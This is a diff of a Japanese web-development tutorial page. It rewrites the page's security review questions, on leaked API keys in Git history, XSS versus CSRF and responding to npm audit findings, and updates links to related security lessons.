-<h2 id="_13">確認問題<a class="headerlink" href="#_13" title="Permanent link">&para;</a></h2>
+<h2 id="_19">確認問題<a class="headerlink" href="#_19" title="Permanent link">&para;</a></h2>
 <ol>
-<li>セキュリティ は、何の問題を解決するための考え方・道具ですか。</li>
-<li>このページで出てきた重要語を 3 つ選び、それぞれ 1 文で説明してください。</li>
-<li>コード例やコマンド例がある場合、入力・処理・出力を分けて説明してください。</li>
-<li>このページの内容が、前後の STEP や自分の作りたいものにどうつながるか説明してください。</li>
+<li>API キーを誤って GitHub にプッシュしてしまいました。「すぐ削除コミットしたから大丈夫」と言っている人に、何が問題かを説明してください。</li>
+<li>XSS と CSRF を「被害者のブラウザで何が起きるか」という観点で比較して説明してください。</li>
+<li><code>npm audit</code> で <code>critical</code> の脆弱性が 1 件見つかりました。どのような順序で対応しますか？</li>
 </ol>
 <hr />
-<h2 id="_14">関連ページ<a class="headerlink" href="#_14" title="Permanent link">&para;</a></h2>
+<h2 id="_20">関連ページ<a class="headerlink" href="#_20" title="Permanent link">&para;</a></h2>
 <ul>
-<li><a href="../ネットワーク基礎/">ネットワーク基礎</a> — HTTPS の仕組み・通信の基礎</li>
-<li><a href="../GitHub/">GitHub</a> — リポジトリの権限管理</li>
-<li><a href="../npm/">npm / Node.js</a> — <code>npm audit</code> の実行</li>
+<li><a href="../マルウェア・サイバー攻撃/">マルウェア・サイバー攻撃</a> — ウイルス・DDoS の仕組み</li>
+<li><a href="../暗号技術/">暗号技術</a> — HTTPS の中身・ハッシュ・デジタル署名</li>
+<li><a href="../セキュリティ詳解/">セキュリティ詳解</a> — SQLi・XSS・CSRF のコードレベルの実装</li>
+<li><a href="../認証・認可/">認証・認可</a> — JWT・OAuth2 の実装</li>
+<li><a href="../OWASP-Top10/">OWASP Top 10</a> — Web アプリの代表的な脆弱性10項目</li>
 </ul>
-<hr />
-<p><a href="../">← ホームへ</a></p>
 
 
 
